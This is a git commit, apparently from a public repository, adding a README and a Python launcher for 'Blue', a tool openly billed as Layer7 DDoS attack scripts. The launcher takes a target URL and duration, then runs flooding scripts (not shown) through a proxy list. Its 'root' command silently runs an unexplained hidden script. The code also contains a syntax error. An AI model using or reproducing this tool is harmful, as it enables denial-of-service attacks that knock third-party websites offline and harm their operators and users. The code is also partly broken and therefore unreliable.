470adb3cc5c1b3585accef4dd25e8e2f5019d47d
support-bot101 <AlfieH481@hotmail.com>
2025-01-21 22:46:17 +0000

    Add files via upload

---
+++ README.md
@@ -0,0 +1,15 @@
+# Blue 🌠 
+Layer7 DDoS Attack Scripts
+## use and install
+to install-
+git clone -repository link-
+cd blue
+Pip install -r requirements.txt
+python3 run.py
+### EROROR! 🔥
+- When throws errors like MODULES NOT FOUND just install module 
+- if error code is PYTHON mostly u need run "pip install -r requirements.txt" in the directory of the folder
+- if error code is NODEJS you need to find module name and run "npm install MODULENAME"
+
+#### don't be afraid 📛
+" don't be afraid " is our moto and saying like a calling card so people know I was there
---
+++ run.py
@@ -0,0 +1,122 @@
+import subprocess
+import sys
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+from pystyle import Colors, Colorate
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+proxys = open('proxy.txt').readlines()
+bots = len(proxys)
+bots_str = str(bots)
+
+def si():
+    print(Colorate.Diagonal(Colors.red_to_white, "GOODLUCK | USER: imscruz | PLAN :: FREE! | Proxy: " + bots_str + " | kys"))
+    print("")
+  
+def layer7():
+    clear()
+    si()
+    print(Colorate.Horizontal(Colors.red_to_white, ''' 
+██████╗ ██╗███╗   ███╗
+██╔══██╝██║████╗ ████║
+███████ ██║██╔████╔██║
+██║  ██ ██║██║╚██╔╝██║
+██████╗ ██║██║ ╚═╝ ██║   
+ ╚═════╝╚═╝╚═╝     ╚═╝  
+v0.1.0
+
+            "don't be afraid"
+        
+                Layer7 LIST
+           
+!BYPASS - WITH HIGH RPS TRY TO BYPASS ISP 
+!CRASH - FOR LOW QUALITY WEBSERVER  
+
+
+HOW WORK
+!CRASH https://example.com 60
+or
+!BYPASS https:example.com 60 to use a proxy list
+type "editp" to edit the Proxy list
+'''))
+
+def menu():
+    clear()
+    print(Colorate.Diagonal(Colors.red_to_white
+   , "dont be afraid| USER: anonymous| PLAN :: FREE! | Proxy: " + bots_str + " | WORKING NOW "))
+    print("")
+    banner = '''
+██████╗ ██╗███╗   ███╗
+██╔══██╝██║████╗ ████║
+███████ ██║██╔████╔██║
+██║  ██ ██║██║╚██╔╝██║
+██████╗ ██║██║ ╚═╝ ██║   
+ ╚═════╝╚═╝╚═╝     ╚═╝ 
+v0.1.0
+
+MADE BY ~ encypt ~
+
+list of commands type "HELP"
+'''
+    print(Colorate.Diagonal(Colors.red_to_white, banner))
+def main():
+    menu()
+    while(True):
+        cnc = input(Colorate.Diagonal(Colors.red_to_white, "imscruz@99#~"))
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()     
+        elif "CRASH" in cnc:
+            try: 
+                host = cnc.split()[1]
+                time = cnc.split()[2]
+                print("Attacking " + host + " For " + time + " ")
+                os.system(f'go run CRASH.go {host} 9999 get {time} nil')
+
+            except IndexError:
+                print('Usage: METHOD URL TIME');
+                print('Example: METHOD URL TIME');
+        elif "editp" in cnc
+            os.system("nano proxy.txt")
+        elif "BYPASS" in cnc:
+            try: 
+                host = cnc.split()[1]
+                time = cnc.split()[2]
+                print("Attacking " + host + " Forise " + time + " ")
+                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
+            except IndexError:
+                print('Usage: METHOD URL TIME');
+                print('Example: METHOD URL TIME');
+
+        elif "root" in cnc:
+            try: 
+                print("ARE YOU TRYING TO GET ROOT? GET LOST!")
+                os.system(f'python3 socks/typings_.py')
+            except IndexError:
+                print('DONT!');
+                print('DO NOT USE THAT');
+   
+        elif "help" in cnc:
+            print(Colorate.Horizontal(Colors.red_to_white, ''' 
+LAYER7 - TO SEE ALL LAYER7 LIST
+HELP - FOR HELP
+CLEAR - SOME CLEANING!
+'''))
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    clear()
+    main()
+login()
